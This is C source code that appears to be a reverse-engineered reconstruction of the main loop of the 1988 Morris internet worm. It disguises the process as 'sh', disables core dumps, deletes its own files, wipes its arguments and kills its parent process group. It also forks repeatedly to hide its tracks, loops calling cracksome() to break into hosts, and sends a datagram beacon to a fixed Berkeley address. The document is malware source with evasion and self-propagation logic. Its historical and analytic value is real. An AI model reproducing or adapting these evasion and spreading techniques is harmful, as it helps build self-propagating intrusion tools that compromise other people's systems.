#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>

main(argc, argv)
	int	argc;
	char	**argv;
{
	int	pgrp;
	time_t	tval;
	int	cnt, cnt2;
	int	iargc;
	struct	rlimit rlim;

	f8 = 0;
	strcpy(*argv, XS(1, "sh"));		/* mcount+4 */
	srandom(tval = time(&tval));
	
	/* don't drop core */
	rlim.rlim_cur = rlim.rlim_max = 0;
	if (setrlimit(RLIMIT_CORE, &rlim) < 0)
		perror("setrlimit");

	signal(SIGPIPE, SIG_DFL);

	/* if passed -p as an argument, use the arg as the process id */
	pgrp = 0;
	iargc = 1;
	if (argc > 2 && strcmp(argv[iargc], XS("-p")) == 0) {
		pgrp = atoi(argv[2]);
		iargc += 2;
	}

	/* read the objects into memory */
	for (cnt = iargc; cnt < argc; cnt++) {
		if (loadobject(argv[cnt]) == 0)
			exit(1);
		/* if pgrp set, unlink each object after reading it */
		if (pgrp)
			unlink(argv[cnt]);
	}

	/* if no arguments or l1.c not one of the arguments, quit */
	if (nobjects < 0 || getobjectbyname(XS("l1.c")) == 0)
		exit(1);

	if (pgrp) {
		/* close all file descriptors */
		for (cnt = 0; cnt < 32; cnt++)
			close(cnt);
		/* unlink me, other files already created? */
		unlink(*argv);
		unlink(XS("sh"));
		unlink(XS("/tmp/.dumb"));
	}

	/* zero out our arguments */
	for (cnt = 1; cnt < argc; cnt++)
		for (cnt2 = 0; argv[cnt][cnt2]; cnt2++)
			argv[cnt][cnt2] = 0;

	/* check network interfaces; fail if no interfaces */
	if (if_init() == 0)
		exit(1);

	/*
	 * we *think* this is to kill the process group that kicked us
	 * off; if so, the kill should be a killpg.
	 */
	if (pgrp != 0) {
		if (getpgrp(getpid()) == pgrp)
			setpgrp(getpid(), getpid());
		kill(pgrp, SIGKILL);
	}
	doit();
}


doit()
{
	time_t time1, time2;

	time(&time1);
	srandom(time1);

	time2 = time1;
	if (hg() == 0  && hl() == 0)
		ha();
	/* try to contact server; become server */
	checkother();
	/* if ! (1 in 15) send a dgram to ernie */
	send_message();

	for (;;) {
		/* attempt to crack something */
		cracksome();

		/* spend 30 seconds, attending to clients */
		other_sleep(30);

		/* crack some more */
		cracksome();

		/* hide our tracks (should be more often) */
		if (fork() > 0)
			exit(0);

		/* reinitialize routing/networks */
		if (hg() == 0 && hi() == 0 && ha() == 0)
			hl();

		/* spend 2 minutes, attending to clients */
		other_sleep(120);

		/* if running more than 12 hours clean up host list */
		time(&time1);
		if (time1 - time2 > 43200)
			h_clean();
	
		if (pleasequit && nextw > 10)
			exit(0);
	}
}

/* 0x3dc */
/* if 1 in 15, send a datagram to ernie.berkeley.edu. */
send_message()
{
	struct	sockaddr_in sin;
	int	fd;
	char	schar;

	if ((random() % 15) != 7)
		return;
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port  = htons(11357);
	sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return;
	if (sendto(fd, &schar, sizeof(schar), 0, &sin, sizeof(sin)) < 0)
		perror("sendto");
	close(fd);
}
